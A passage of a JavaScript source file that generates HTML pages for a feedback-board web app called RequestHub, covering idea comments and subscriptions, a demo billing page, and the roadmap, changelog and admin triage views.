          });
      });

      var subscribeBtn = document.getElementById('subscribeBtn');
      if (subscribeBtn) {
        subscribeBtn.addEventListener('click', function () {
          var emailInput = document.getElementById('subscribeEmail');
          var email = emailInput.value.trim();
          if (!email) return;
          subscribeBtn.disabled = true;
          subscribeBtn.textContent = 'Subscribing...';
          fetch('/api/ideas/' + idea.id + '/subscribe', {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ email: email }),
          })
            .then(function (r) { return r.json(); })
            .then(function (d) {
              if (d.ok) {
                addSubscribedId(idea.id);
                document.getElementById('subscribeRow').innerHTML =
                  '<span class="subscribe-done">&#9993; You\\'ll get emailed about updates to this idea.</span>';
              } else {
                subscribeBtn.disabled = false;
                subscribeBtn.textContent = 'Notify me about updates';
                alert(d.error || 'Could not subscribe right now - please try again.');
              }
            })
            .catch(function () {
              subscribeBtn.disabled = false;
              subscribeBtn.textContent = 'Notify me about updates';
              alert('Could not subscribe right now - please try again.');
            });
        });
      }

      document.getElementById('commentBtn').addEventListener('click', function () {
        var name = document.getElementById('commentName').value.trim() || (isAdmin ? 'Team' : 'Anonymous');
        var bodyInput = document.getElementById('commentBody');
        var body = bodyInput.value.trim();
        var internalCheckbox = document.getElementById('commentInternal');
        if (!body) return;
        fetch('/api/ideas/' + idea.id + '/comments', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            authorName: name,
            body: body,
            customerSlug: customerSlug,
            internal: internalCheckbox ? internalCheckbox.checked : false,
          }),
        })
          .then(function (r) { return r.json(); })
          .then(function () {
            bodyInput.value = '';
            if (internalCheckbox) internalCheckbox.checked = false;
            loadComments(idea.id);
          });
      });

      loadComments(idea.id);
      loadTimeline(idea.id);
    }

    function loadTimeline(id) {
      var el = document.getElementById('timeline');
      if (!el) return;
      fetch('/api/ideas/' + id + '/history')
        .then(function (r) { return r.json(); })
        .then(function (d) {
          var history = d.history || [];
          if (!history.length) {
            el.innerHTML = '';
            return;
          }
          el.innerHTML = history.map(function (h) {
            var toLabel = statusLabels[h.to_status] || h.to_status;
            var fromLabel = h.from_status ? (statusLabels[h.from_status] || h.from_status) : null;
            var date = h.changed_at ? new Date(h.changed_at).toLocaleDateString() : '';
            return '<div class="timeline-item"><span class="dot"></span>' +
              (fromLabel ? escapeHtml(fromLabel) + ' &rarr; ' : '') + escapeHtml(toLabel) +
              '<span class="timeline-date">' + date + '</span></div>';
          }).join('');
        });
    }

    function loadComments(id) {
      var listEl = document.getElementById('commentsList');
      fetch('/api/ideas/' + id + '/comments?customer=' + encodeURIComponent(customerSlug))
        .then(function (r) { return r.json(); })
        .then(function (d) {
          var comments = d.comments || [];
          if (!comments.length) {
            listEl.innerHTML = '<div class="empty">No comments yet.</div>';
            return;
          }
          listEl.innerHTML = comments.map(function (c) {
            var initial = (c.author_name || '?').trim().charAt(0).toUpperCase() || '?';
            var classes = 'comment' + (c.is_team ? ' is-team' : '') + (c.internal ? ' is-internal' : '');
            var badges = (c.is_team ? '<span class="comment-badge team">Team</span>' : '') +
              (c.internal ? '<span class="comment-badge internal">Internal</span>' : '');
            return '<div class="' + classes + '">' +
              '<div class="comment-avatar">' + escapeHtml(initial) + '</div>' +
              '<div class="comment-body-text">' + badges + '<span class="comment-author">' + escapeHtml(c.author_name) + '</span>' + escapeHtml(c.body) + '</div>' +
              '</div>';
          }).join('');
        });
    }

    function load() {
      fetch('/api/ideas?customer=' + encodeURIComponent(customerSlug))
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d.statusLabels) statusLabels = d.statusLabels;
          var idea = (d.ideas || []).find(function (i) { return String(i.id) === ideaId; });
          if (!idea) {
            fetch('/api/ideas/' + ideaId + '/merge-status?customer=' + encodeURIComponent(customerSlug))
              .then(function (r) { return r.json(); })
              .then(function (m) {
                if (m.ok && m.idea && m.idea.mergedInto) {
                  document.getElementById('page').innerHTML =
                    '<div class="not-found">This idea was merged into <a href="/b/' + encodeURIComponent(customerSlug) + '/ideas/' + m.idea.mergedInto.id + '">' +
                    escapeHtml(m.idea.mergedInto.title) + '</a>.</div>';
                } else {
                  document.getElementById('page').innerHTML = '<div class="not-found">This idea doesn\\'t exist or was removed.</div>';
                }
              })
              .catch(function () {
                document.getElementById('page').innerHTML = '<div class="not-found">This idea doesn\\'t exist or was removed.</div>';
              });
            return;
          }
          renderIdea(idea);
        })
        .catch(function () {
          document.getElementById('page').innerHTML =
            '<div class="not-found">Could not load this idea right now. <a href="#" onclick="location.reload();return false;">Retry</a></div>';
        });
    }

    load();
  </script>
</body>
</html>`;
}

function billingPage(customerSlug, currentPlan, isOwner) {
  const cards = PLANS.map(function (p) {
    const isCurrent = p.id === currentPlan;
    const features = p.features.map((f) => `<li>${escapeHtml(f)}</li>`).join("");
    return `<div class="plan-card${isCurrent ? " current" : ""}">
      ${isCurrent ? '<div class="current-badge">Current plan</div>' : ""}
      <div class="plan-name">${escapeHtml(p.name)}</div>
      <div class="plan-price">${p.price}<span>${p.period}</span></div>
      <div class="plan-blurb">${escapeHtml(p.blurb)}</div>
      <ul class="plan-features">${features}</ul>
      <button class="plan-btn" data-plan="${p.id}" ${isCurrent ? "disabled" : ""}>${isCurrent ? "Current plan" : "Choose plan"}</button>
    </div>`;
  }).join("");

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Billing - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar { background: var(--card); border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
    .logo-mark { width: 28px; height: 28px; border-radius: 8px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
    .brand { font-weight: 700; font-size: 15px; }
    .brand .org { color: var(--text-faint); font-weight: 500; }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 18px; }
    .nav-right a { color: var(--text-muted); font-size: 13px; text-decoration: none; }
    .nav-right a:hover { color: var(--text); }
    .nav-right a.logout { color: var(--bad); }
    .nav-right a.owner-link { color: var(--accent); font-weight: 600; }
    .page { max-width: 920px; margin: 0 auto; padding: 32px 24px; }
    .hero { margin-bottom: 8px; }
    .hero h1 { font-size: 21px; margin: 0 0 6px; }
    .hero p { margin: 0; color: var(--text-muted); font-size: 13.5px; }
    .demo-note {
      background: var(--warn-tint); border: 1px solid rgba(217, 119, 6, 0.3); color: var(--warn);
      border-radius: 10px; padding: 10px 14px; font-size: 12.5px; margin: 18px 0 24px;
    }
    .plans { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
    @media (max-width: 760px) { .plans { grid-template-columns: 1fr; } }
    .plan-card {
      position: relative; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card);
      padding: 22px 20px; display: flex; flex-direction: column;
    }
    .plan-card.current { border-color: var(--accent); }
    .current-badge {
      position: absolute; top: -10px; left: 20px; background: var(--accent); color: #fff; font-size: 10.5px;
      font-weight: 700; padding: 3px 10px; border-radius: 999px; text-transform: uppercase; letter-spacing: .03em;
    }
    .plan-name { font-weight: 700; font-size: 16px; margin-bottom: 6px; color: var(--text); }
    .plan-price { font-size: 26px; font-weight: 700; margin-bottom: 8px; color: var(--text); }
    .plan-price span { font-size: 13px; font-weight: 500; color: var(--text-muted); }
    .plan-blurb { color: var(--text-muted); font-size: 12.5px; margin-bottom: 16px; line-height: 1.4; }
    .plan-features { list-style: none; padding: 0; margin: 0 0 20px; flex: 1; }
    .plan-features li { font-size: 13px; color: var(--text-muted); padding: 5px 0 5px 20px; position: relative; }
    .plan-features li::before { content: "✓"; position: absolute; left: 0; color: var(--good); font-weight: 700; }
    .plan-btn {
      background: var(--accent); color: #fff; border: none; padding: 10px; border-radius: var(--radius-btn); font-size: 13.5px;
      font-weight: 600; cursor: pointer; font-family: inherit;
    }
    .plan-btn:hover:not(:disabled) { background: var(--accent-hover); }
    .plan-btn:disabled { background: var(--surface-3); color: var(--text-faint); cursor: default; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">RequestHub <span class="org">/ ${escapeHtml(customerSlug)} billing</span></div>
    <nav class="nav-right">
      ${isOwner ? `<a class="owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a href="/b/${encodeURIComponent(customerSlug)}/admin">&larr; Back to triage</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/analytics">Analytics</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/settings">Settings</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/billing">Billing</a>
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      <a class="logout" href="/b/${encodeURIComponent(customerSlug)}/logout">Log out</a>
    </nav>
  </div>
  <div class="page">
    <div class="hero">
      <h1>Billing</h1>
      <p>Choose the plan that fits your team.</p>
    </div>
    <div class="demo-note">This is a demo placeholder - choosing a plan just records your selection. No card is charged, no payment details are collected.</div>
    <div class="plans">${cards}</div>
  </div>
  <script>
    document.querySelectorAll('.plan-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        if (btn.disabled) return;
        btn.disabled = true;
        btn.textContent = 'Switching...';
        fetch('/api/customers/${encodeURIComponent(customerSlug)}/plan', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ plan: btn.getAttribute('data-plan') }),
        })
          .then(function (r) { return r.json(); })
          .then(function () { window.location.reload(); });
      });
    });
  </script>
</body>
</html>`;
}

function roadmapPage(customerSlug, isOwner) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roadmap - ${escapeHtml(customerSlug)} - RequestHub</title>
  <meta name="description" content="See what's under review, planned, in progress, and shipped on ${escapeHtml(customerSlug)}'s roadmap." />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="Roadmap - ${escapeHtml(customerSlug)} - RequestHub" />
  <meta property="og:description" content="See what's under review, planned, in progress, and shipped on ${escapeHtml(customerSlug)}'s roadmap." />
  <meta name="twitter:card" content="summary" />
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar {
      background: var(--card); border-bottom: 1px solid var(--border);
      padding: 0 24px; display: flex; align-items: center; gap: 4px; height: 56px;
    }
    @media (max-width: 600px) {
      .topbar { flex-wrap: wrap; height: auto; padding: 10px 16px; }
    }
    .logo-mark { width: 26px; height: 26px; border-radius: 7px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; flex-shrink: 0; }
    .brand { font-weight: 700; font-size: 14px; margin-right: 14px; }
    .top-tab { color: var(--text-muted); text-decoration: none; font-size: 13.5px; font-weight: 600; padding: 8px 12px; border-radius: 8px; }
    .top-tab:hover { color: var(--text); background: var(--surface-2); }
    .top-tab.active { color: var(--accent); background: var(--accent-tint); }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 8px; }
    .nav-admin-link { color: var(--text-muted); text-decoration: none; font-size: 13px; font-weight: 600; }
    .nav-admin-link:hover { color: var(--text); }
    .nav-admin-link.owner-link { color: var(--accent); }

    .page { max-width: 1100px; margin: 0 auto; padding: 24px; }
    .page-title { font-size: 20px; font-weight: 700; margin: 0 0 18px; }

    .board { display: grid; grid-template-columns: repeat(5, 1fr); gap: 14px; align-items: start; }
    @media (max-width: 1100px) { .board { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 600px) { .board { grid-template-columns: 1fr; } }

    .column { background: var(--surface-2); border-radius: var(--radius-card); padding: 14px; }
    .column-header { display: flex; align-items: center; gap: 8px; padding: 0 2px 12px; }
    .column-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
    .column-dot.under_review { background: var(--text-faint); }
    .column-dot.planned { background: var(--info); }
    .column-dot.in_progress { background: var(--warn); }
    .column-dot.shipped { background: var(--good); }
    .column-dot.declined { background: var(--bad); }
    .column-title { font-weight: 700; font-size: 13.5px; color: var(--text); }
    .column-count { margin-left: auto; background: var(--card); color: var(--text-faint); font-size: 11.5px; font-weight: 600; padding: 1px 7px; border-radius: 999px; }

    .card { background: var(--card); border: 1px solid var(--border); border-left-width: 3px; border-radius: 12px; padding: 13px 14px 13px 12px; margin-bottom: 8px; display: flex; gap: 10px; align-items: flex-start; }
    .card-body { flex: 1; min-width: 0; }
    .card-title { font-weight: 600; font-size: 13.5px; color: var(--text); }
    .card-desc { color: var(--text-muted); font-size: 12px; margin-top: 4px; line-height: 1.4; }
    .card-meta { margin-top: 10px; display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
    .chip { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: var(--radius-pill); font-weight: 600; font-size: 10.5px; }
    .vote-box {
      flex-shrink: 0; display: flex; flex-direction: column; align-items: center; justify-content: center;
      width: 32px; border: 1px solid var(--border); border-radius: 8px; padding: 4px 0; color: var(--text-faint);
    }
    .vote-box .icon { width: 12px; height: 12px; }
    .vote-box .vote-num { font-size: 12px; font-weight: 700; color: var(--text); }
    .empty-col { color: var(--text-faint); font-size: 12px; padding: 10px 2px; }
    .empty { color: var(--text-faint); font-size: 13.5px; text-align: center; padding: 40px 16px; }
    .empty a { color: var(--accent); }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">${escapeHtml(customerSlug)}</div>
    <a class="top-tab" href="/b/${encodeURIComponent(customerSlug)}">Feedback</a>
    <a class="top-tab active" href="/b/${encodeURIComponent(customerSlug)}/roadmap">Roadmap</a>
    <a class="top-tab" href="/b/${encodeURIComponent(customerSlug)}/changelog">Changelog</a>
    <div class="nav-right">
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      ${isOwner ? `<a class="nav-admin-link owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a class="nav-admin-link" href="/b/${encodeURIComponent(customerSlug)}/admin">Admin</a>
    </div>
  </div>

  <div class="page">
    <h1 class="page-title">Roadmap</h1>
    <div class="board" id="board"><div class="empty">Loading...</div></div>
  </div>

  <script>
    var customerSlug = ${JSON.stringify(customerSlug)};
    var DEFAULT_LABELS = { under_review: "Under Review", planned: "Planned", in_progress: "In Progress", shipped: "Shipped", declined: "Declined" };

    var CATEGORY_PALETTE = [
      { bg: 'var(--accent-tint)', fg: 'var(--accent)' },
      { bg: 'var(--bad-tint)', fg: 'var(--bad)' },
      { bg: 'var(--good-tint)', fg: 'var(--good)' },
      { bg: 'var(--warn-tint)', fg: 'var(--warn)' },
      { bg: 'var(--info-tint)', fg: 'var(--info)' },
    ];
    function categoryColor(name) {
      var hash = 0;
      for (var i = 0; i < (name || '').length; i++) hash = (hash * 31 + name.charCodeAt(i)) >>> 0;
      return CATEGORY_PALETTE[hash % CATEGORY_PALETTE.length];
    }

    function escapeHtml(s) {
      var d = document.createElement('div');
      d.innerText = s || '';
      return d.innerHTML;
    }

    function render(ideas, statusLabels, hiddenRoadmapStatuses) {
      var labels = statusLabels || DEFAULT_LABELS;
      var hidden = hiddenRoadmapStatuses || [];
      var COLUMNS = ["under_review", "planned", "in_progress", "shipped", "declined"]
        .filter(function (key) { return hidden.indexOf(key) === -1; })
        .map(function (key) {
          return { key: key, label: labels[key] || DEFAULT_LABELS[key] };
        });
      var board = document.getElementById('board');
      board.innerHTML = COLUMNS.map(function (col) {
        var items = ideas.filter(function (i) { return i.status === col.key; })
          .sort(function (a, b) { return b.votes - a.votes; });
        var cards = items.length
          ? items.map(function (i) {
              var catColor = categoryColor(i.category);
              return '<div class="card" style="border-left-color:' + catColor.fg + '">' +
                '<div class="card-body">' +
                '<div class="card-title">' + escapeHtml(i.title) + '</div>' +
                (i.description ? '<div class="card-desc">' + escapeHtml(i.description) + '</div>' : '') +
                '<div class="card-meta">' +
                '<span class="chip" style="background:' + catColor.bg + ';color:' + catColor.fg + '">' + escapeHtml(i.category) + '</span>' +
                (i.tags || []).map(function (t) { return '<span class="tag-chip">#' + escapeHtml(t) + '</span>'; }).join('') +
                '</div>' +
                '</div>' +
                '<div class="vote-box"><svg class="icon" viewBox="0 0 24 24"><polyline points="18 15 12 9 6 15"/></svg><span class="vote-num">' + i.votes + '</span></div>' +
                '</div>';
            }).join('')
          : '<div class="empty-col">Nothing here yet.</div>';
        return '<div class="column">' +
          '<div class="column-header"><span class="column-dot ' + col.key + '"></span>' +
          '<span class="column-title">' + escapeHtml(col.label) + '</span>' +
          '<span class="column-count">' + items.length + '</span></div>' +
          cards +
          '</div>';
      }).join('');
    }

    fetch('/api/ideas?customer=' + encodeURIComponent(customerSlug))
      .then(function (r) { return r.json(); })
      .then(function (d) { render(d.ideas || [], d.statusLabels, d.hiddenRoadmapStatuses); })
      .catch(function () {
        document.getElementById('board').innerHTML =
          '<div class="empty">Could not load the roadmap right now. <a href="#" onclick="location.reload();return false;">Retry</a></div>';
      });
  </script>
</body>
</html>`;
}

function changelogPage(customerSlug, isOwner) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Changelog - ${escapeHtml(customerSlug)} - RequestHub</title>
  <meta name="description" content="See what's recently shipped on ${escapeHtml(customerSlug)}'s changelog." />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="Changelog - ${escapeHtml(customerSlug)} - RequestHub" />
  <meta property="og:description" content="See what's recently shipped on ${escapeHtml(customerSlug)}'s changelog." />
  <meta name="twitter:card" content="summary" />
  <link rel="alternate" type="application/rss+xml" title="${escapeHtml(customerSlug)} changelog" href="/b/${encodeURIComponent(customerSlug)}/changelog.rss" />
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar {
      background: var(--card); border-bottom: 1px solid var(--border);
      padding: 0 24px; display: flex; align-items: center; gap: 4px; height: 56px;
    }
    @media (max-width: 600px) {
      .topbar { flex-wrap: wrap; height: auto; padding: 10px 16px; }
    }
    .logo-mark { width: 26px; height: 26px; border-radius: 7px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; flex-shrink: 0; }
    .brand { font-weight: 700; font-size: 14px; margin-right: 14px; }
    .top-tab { color: var(--text-muted); text-decoration: none; font-size: 13.5px; font-weight: 600; padding: 8px 12px; border-radius: 8px; }
    .top-tab:hover { color: var(--text); background: var(--surface-2); }
    .top-tab.active { color: var(--accent); background: var(--accent-tint); }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 8px; }
    .nav-admin-link { color: var(--text-muted); text-decoration: none; font-size: 13px; font-weight: 600; }
    .nav-admin-link:hover { color: var(--text); }
    .nav-admin-link.owner-link { color: var(--accent); }

    .page { max-width: 720px; margin: 0 auto; padding: 32px 24px; }
    .page-title { font-size: 22px; font-weight: 700; margin: 0 0 6px; }
    .page-sub { color: var(--text-muted); font-size: 13.5px; margin: 0 0 28px; }

    .entry { display: flex; gap: 20px; padding: 0 0 28px; margin-bottom: 28px; border-bottom: 1px solid var(--border); }
    .entry:last-child { border-bottom: none; }
    .entry-date { flex-shrink: 0; width: 100px; color: var(--text-faint); font-size: 12px; padding-top: 2px; }
    .entry-body { flex: 1; min-width: 0; }
    .entry-title { font-size: 16px; font-weight: 700; margin: 0 0 6px; }
    .entry-desc { color: var(--text-muted); font-size: 13.5px; line-height: 1.6; white-space: pre-wrap; }
    .chip { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: var(--radius-pill); font-weight: 600; font-size: 11px; margin-bottom: 8px; }
    .empty { color: var(--text-faint); font-size: 13.5px; text-align: center; padding: 60px 16px; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">${escapeHtml(customerSlug)}</div>
    <a class="top-tab" href="/b/${encodeURIComponent(customerSlug)}">Feedback</a>
    <a class="top-tab" href="/b/${encodeURIComponent(customerSlug)}/roadmap">Roadmap</a>
    <a class="top-tab active" href="/b/${encodeURIComponent(customerSlug)}/changelog">Changelog</a>
    <div class="nav-right">
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      ${isOwner ? `<a class="nav-admin-link owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a class="nav-admin-link" href="/b/${encodeURIComponent(customerSlug)}/admin">Admin</a>
    </div>
  </div>

  <div class="page">
    <h1 class="page-title">What's new</h1>
    <p class="page-sub">Everything we've shipped, most recent first. <a href="/b/${encodeURIComponent(customerSlug)}/changelog.rss" style="color:var(--accent);">Subscribe via RSS</a></p>
    <div id="list"><div class="empty">Loading...</div></div>
  </div>

  <script>
    var customerSlug = ${JSON.stringify(customerSlug)};

    function escapeHtml(s) {
      var d = document.createElement('div');
      d.innerText = s || '';
      return d.innerHTML;
    }

    var CATEGORY_PALETTE = [
      { bg: 'var(--accent-tint)', fg: 'var(--accent)' },
      { bg: 'var(--bad-tint)', fg: 'var(--bad)' },
      { bg: 'var(--good-tint)', fg: 'var(--good)' },
      { bg: 'var(--warn-tint)', fg: 'var(--warn)' },
      { bg: 'var(--info-tint)', fg: 'var(--info)' },
    ];
    function categoryColor(name) {
      var hash = 0;
      for (var i = 0; i < (name || '').length; i++) hash = (hash * 31 + name.charCodeAt(i)) >>> 0;
      return CATEGORY_PALETTE[hash % CATEGORY_PALETTE.length];
    }

    fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/changelog')
      .then(function (r) { return r.json(); })
      .then(function (d) {
        var items = d.items || [];
        var list = document.getElementById('list');
        if (!items.length) {
          list.innerHTML = '<div class="empty">Nothing shipped yet - check back soon.</div>';
          return;
        }
        list.innerHTML = items.map(function (it) {
          var date = it.shipped_at ? new Date(it.shipped_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' }) : '';
          var cc = categoryColor(it.category);
          return '<div class="entry">' +
            '<div class="entry-date">' + date + '</div>' +
            '<div class="entry-body">' +
            '<span class="chip" style="background:' + cc.bg + ';color:' + cc.fg + '">' + escapeHtml(it.category) + '</span>' +
            '<div class="entry-title">' + escapeHtml(it.title) + '</div>' +
            (it.description ? '<div class="entry-desc">' + escapeHtml(it.description) + '</div>' : '') +
            '</div>' +
            '</div>';
        }).join('');
      })
      .catch(function () {
        document.getElementById('list').innerHTML =
          '<div class="empty">Could not load the changelog right now. <a href="#" onclick="location.reload();return false;">Retry</a></div>';
      });
  </script>
</body>
</html>`;
}

function adminPage(customerSlug, isOwner) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Triage - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar { background: var(--card); border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
    .logo-mark { width: 28px; height: 28px; border-radius: 8px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; flex-shrink: 0; }
    .brand { font-weight: 700; font-size: 15px; }
    .brand .org { color: var(--text-faint); font-weight: 500; }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
    .nav-right a { color: var(--text-muted); font-size: 13px; text-decoration: none; }
    .nav-right a:hover { color: var(--text); }
    .nav-right a.logout { color: var(--bad); }
    .nav-right a.owner-link { color: var(--accent); font-weight: 600; }

    .page { max-width: 1280px; margin: 0 auto; padding: 24px; }

    .filters-row { display: flex; gap: 8px; margin-bottom: 14px; flex-wrap: wrap; }
    .filters-row input, .filters-row select {
      background: var(--card); border: 1px solid var(--border); color: var(--text);
      border-radius: 9px; padding: 9px 12px; font-size: 13px; font-family: inherit;
    }
    .filters-row input { flex: 1; min-width: 160px; }
    .filters-row input::placeholder { color: var(--text-faint); }
    .filters-row select { cursor: pointer; }

    .bulk-bar {
      display: none; align-items: center; gap: 10px; flex-wrap: wrap; background: var(--accent-tint); border: 1px solid var(--accent);
      border-radius: 10px; padding: 9px 12px; margin-bottom: 14px; font-size: 13px; color: var(--text);
    }
    .bulk-bar.open { display: flex; }
    .bulk-bar select {
      background: var(--card); border: 1px solid var(--border); color: var(--text);
      border-radius: 8px; padding: 6px 10px; font-size: 13px; font-family: inherit; cursor: pointer;
    }
    .bulk-bar button {
      border: none; border-radius: 8px; padding: 6px 12px; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit;
    }
    .bulk-apply-btn { background: var(--accent); color: #fff; }
    .bulk-delete-btn { background: var(--bad-tint); color: var(--bad); }
    .bulk-merge-btn { background: var(--info-tint); color: var(--info); }
    .bulk-clear-btn { background: none; color: var(--text-muted); margin-left: auto; }

    .empty { color: var(--text-faint); font-size: 13.5px; text-align: center; padding: 40px 16px; }

    .board { display: grid; grid-template-columns: repeat(5, 1fr); gap: 14px; align-items: start; }
    @media (max-width: 1200px) { .board { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 600px) { .board { grid-template-columns: 1fr; } }

    .column { background: var(--surface-2); border-radius: var(--radius-card); padding: 12px; min-height: 80px; transition: background-color .12s ease; }
    .column.drag-over { background: var(--accent-tint); }
    .column-header { display: flex; align-items: center; gap: 8px; padding: 0 2px 12px; }
    .column-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
    .column-dot.under_review { background: var(--text-faint); }
    .column-dot.planned { background: var(--info); }
    .column-dot.in_progress { background: var(--warn); }
    .column-dot.shipped { background: var(--good); }
    .column-dot.declined { background: var(--bad); }
    .column-title { font-weight: 700; font-size: 13px; color: var(--text); }
    .column-count { margin-left: auto; background: var(--card); color: var(--text-faint); font-size: 11px; font-weight: 600; padding: 1px 7px; border-radius: 999px; }

    .card { position: relative; background: var(--card); border: 1px solid var(--border); border-left-width: 3px; border-radius: 12px; padding: 12px 48px 12px 28px; margin-bottom: 8px; cursor: grab; }
    .card.dragging { opacity: 0.4; }
    .card.selected { outline: 2px solid var(--accent); outline-offset: -1px; }
    .card.pinned { background: var(--accent-tint); }
    .card-select {
      position: absolute; top: 10px; left: 8px; width: 14px; height: 14px; cursor: pointer; margin: 0;
    }
    .card-delete-btn {
      position: absolute; top: 6px; right: 6px; width: 18px; height: 18px; line-height: 16px; text-align: center;
      border: none; border-radius: 50%; background: transparent; color: var(--text-faint); font-size: 15px; cursor: pointer; padding: 0;
    }
    .card-delete-btn:hover { background: var(--bad-tint); color: var(--bad); }
    .card-pin-btn {
      position: absolute; top: 6px; right: 26px; width: 18px; height: 18px; line-height: 16px; text-align: center;
      border: none; border-radius: 50%; background: transparent; color: var(--text-faint); font-size: 11px; cursor: pointer; padding: 0; opacity: 0.5;
    }
    .card-pin-btn:hover { background: var(--accent-tint); color: var(--accent); opacity: 1; }
    .card-pin-btn.active { color: var(--accent); opacity: 1; }
    .card-title { font-weight: 600; font-size: 13px; color: var(--text); }
    .card-desc { color: var(--text-muted); font-size: 11.5px; margin-top: 4px; line-height: 1.4; }
    .card-meta { margin-top: 9px; display: flex; align-items: center; gap: 5px; flex-wrap: wrap; }

    .chip { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: 999px; font-weight: 600; font-size: 10.5px; }
    .chip.badge { background: var(--surface-3); color: var(--text-muted); text-decoration: none; }
    .chip.badge:hover { color: var(--text); }
    .card-votes { color: var(--text-faint); font-size: 10.5px; margin-left: auto; font-weight: 600; }
    .tag-edit-input {
      width: 100%; margin-top: 7px; background: var(--surface-2); border: 1px solid transparent; color: var(--text-muted);
      border-radius: 6px; padding: 3px 7px; font-size: 10.5px; font-family: inherit; cursor: text;
    }
    .tag-edit-input:hover { border-color: var(--border); color: var(--text); }
    .tag-edit-input:focus { border-color: var(--accent); color: var(--text); outline: 2px solid var(--accent); outline-offset: 1px; }
    .empty-col { color: var(--text-faint); font-size: 12px; padding: 10px 2px; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">RequestHub <span class="org">/ ${escapeHtml(customerSlug)} triage</span></div>
    <nav class="nav-right">
      ${isOwner ? `<a class="owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a href="/b/${encodeURIComponent(customerSlug)}">&larr; Back to board</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/analytics">Analytics</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/changelog">Changelog</a>
      <a href="/api/customers/${encodeURIComponent(customerSlug)}/export.csv">Export CSV</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/settings">Settings</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/billing">Billing</a>
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      <a class="logout" href="/b/${encodeURIComponent(customerSlug)}/logout">Log out</a>
    </nav>
  </div>

  <div class="page">
    <div class="filters-row">
      <input id="search" placeholder="Search feedback..." aria-label="Search feedback" />
      <select id="category">
        <option value="all">All categories</option>
        <option value="Feature">Feature</option>
        <option value="Bug">Bug</option>
        <option value="Feedback">Feedback</option>
      </select>
    </div>
    <div class="bulk-bar" id="bulkBar">
      <span id="bulkCount">0 selected</span>
      <select id="bulkStatus"></select>
      <button type="button" class="bulk-apply-btn" id="bulkApplyBtn">Change status</button>
      <button type="button" class="bulk-merge-btn" id="bulkMergeBtn" style="display:none;" title="Pick the two selected ideas to merge as duplicates">Merge as duplicates</button>
      <button type="button" class="bulk-delete-btn" id="bulkDeleteBtn">Delete</button>
      <button type="button" class="bulk-clear-btn" id="bulkClearBtn">Clear selection</button>
    </div>
